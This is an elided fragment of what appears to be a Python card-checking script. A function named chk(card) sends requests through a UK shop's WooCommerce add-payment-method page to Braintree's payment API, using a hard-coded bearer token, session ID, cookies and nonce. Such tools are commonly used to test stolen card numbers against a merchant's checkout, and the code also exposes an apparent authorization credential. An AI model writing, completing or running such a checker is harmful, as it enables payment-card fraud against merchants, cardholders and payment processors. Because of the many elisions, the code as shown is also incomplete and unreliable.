def chk(card):
    ...
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0..PiTICoq1cngdrTcEJg8LtQMGRxd-nCghYzuumF9qjAOYxzZaOG0B00ydQ4dmaqaDDMPvNHG01X2DixCFei15TQ',
    ...
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '10c42789-85ac-4f28-8889-49b14c2d1bba',
    },
...
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
    ...
    'sbjs_current_add': 'fd%3D2024-07-01%2014%3A59%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-01%2014%3A59%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    ...
    'woocommerce-add-payment-method-nonce': 'e4095944d5',
